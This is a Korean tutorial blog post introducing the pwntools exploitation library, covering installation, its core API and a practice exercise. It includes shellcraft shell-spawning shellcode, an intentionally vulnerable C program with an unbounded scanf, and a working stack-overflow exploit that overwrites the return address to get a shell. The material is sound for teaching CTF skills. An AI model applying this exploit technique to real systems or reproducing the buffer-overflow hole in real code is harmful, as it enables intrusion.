---
layout: post
title: "pwntools 설치"
categories: [SWING, Writeup]
tags: [pwntools, exploit, CTF]
last_modified_at: 2024-01-22
---

Tool: pwntools
================

익스플로잇을 위한 파이썬 모듈: pwntools

```shell
$ apt-get update
$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
$ python3 -m pip install --upgrade pip
$ python3 -m pip install --upgrade pwntools
```

![pwntools](https://blog.kakaocdn.net/dna/wyRjy/btsDI7VyW8c/AAAAAAAAAAAAAAAAAAAAABOReUdqydpyDV2JU8rbhYFLPdUKinoerawBlW7oAXnz/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=agh9DDJP4qlUVGNo8JXLsjQ4%2Fes%3D)

Pwntools API
------------

**1. process/remote**  
process: 로컬 바이너리 대상으로 익스플로잇  
remote: 원격 서버 대상으로 익스플로잇(ctf에서 많이 씀)

```python
from pwn import *
p = process('./test')
r = remote('example.com', 31337)
```

**2. send/recv**  
send: 데이터 전송(입력과 비슷)

```python
from pwn import *
p = process('./test')

p.send(b'A')  # b'A'를 입력
p.sendline(b'A')  # b'A'입력 후 b'\n'입력
p.sendafter(b'hello', b'A')  # b'hello'를 출력하면 b'A' 입력 
p.sendlineafter(b'hello', b'A')  # b'hello' 출력하면 b'A'+b'\n' 입력
```

recv: 데이터 받기(출력과 비슷)

```python
from pwn import *
p = process('./test')

data = p.recv(1024)  # 데이터 최대 1024바이트까지 받음 
data = p.recvline()  # 개행문자 만날 때까지 받음 
data = p.recvn(5)  # 5바이트만 받음 
data = p.recvuntil(b'hello')  # b'hello' 출력할 때까지 받음
data = p.recvall()  # 프로세스 종료될 때까지 받음
```

**3. packing/unpacking**  
리틀엔디언 패킹 등을 위함 

```python
#!/usr/bin/env python3
# Name: pup.py

from pwn import *

s32 = 0x41424344
s64 = 0x4142434445464748

print(p32(s32))  #리틀 엔디언 처리
print(p64(s64))

s32 = b"ABCD"
s64 = b"ABCDEFGH"

print(hex(u32(s32)))  #16진수 변환
print(hex(u64(s64)))
```

```shell
$ python3 pup.py
b'DCBA'
b'HGFEDCBA'
0x44434241
0x4847464544434241
```

**4. interactive**  
쉘 획득 후 프로세스 접근..?

```python
from pwn import *
p = process('./test')
p.interactive()
```

**5. ELF**  

```python
from pwn import *
e = ELF('./test')
puts_plt = e.plt['puts']  # ./test에서 puts()의 PLT주소를 찾아서 puts_plt에 저장
read_got = e.got['read']  # ./test에서 read()의 GOT주소를 찾아서 read_got에 저장
```

ELF 헤더 열람  
plt와 got는 후술  

**6. context.log**  
익스플로잇 디버깅을 위한 로깅 기능 

```python
from pwn import *
context.log_level = 'error'  # 에러만 출력
context.log_level = 'debug'  # 대상 프로세스와 익스플로잇간에 오가는 모든 데이터를 화면에 출력
context.log_level = 'info'  # 비교적 중요한 정보들만 출력
```

**7. context.arch**  
아키텍처를 저장하기 위함  
이에 따라 몇몇 함수들 동작이 달라짐 

```python
from pwn import *
context.arch = "amd64"  # x86-64 아키텍처
context.arch = "i386"  # x86 아키텍처
context.arch = "arm"  # arm 아키텍처
```

**8. shellcraft**  
자주 사용되는 셸코드 저장 후 생성해줌  
하지만 정적으로 생성되었기 때문에 메모리 상태 반영 X  
이외의 조건 반영 X 

```python
#!/usr/bin/env python3
# Name: shellcraft.py

from pwn import *
context.arch = 'amd64'  # 대상 아키텍처 x86-64

code = shellcraft.sh()  # 셸을 실행하는 셸 코드 
print(code)
```

**9. asm**  
어셈블 기능, 아키텍처 사전 설정 필요 

```python
#!/usr/bin/env python3
# Name: asm.py

from pwn import *
context.arch = 'amd64'  # 익스플로잇 대상 아키텍처 'x86-64'

code = shellcraft.sh()  # 셸을 실행하는 셸 코드
code = asm(code)       # 셸 코드를 기계어로 어셈블
print(code)
```

Pwntools 실습
------------

```cpp
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <unistd.h>
void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};
  execve(cmd, args, NULL);
}
int main() {
  char buf[0x28];
  printf("Input: ");
  scanf("%s", buf);
  return 0;
}
```

```python
#!/usr/bin/python3
#Name: rao.py

from pwn import *          # Import pwntools module

p = process('./rao')       # Spawn process './rao'

elf = ELF('./rao')
get_shell = elf.symbols['get_shell']       # The address of get_shell()

payload = b'A'*0x30        #|       buf      |  <= 'A'*0x30
payload += b'B'*0x8        #|       SFP      |  <= 'B'*0x8
payload += p64(get_shell)  #| Return address |  <= '\xaa\x06\x40\x00\x00\x00\x00\x00'

p.sendline(payload)        # Send payload to './rao'

p.interactive()            # Communicate with shell
```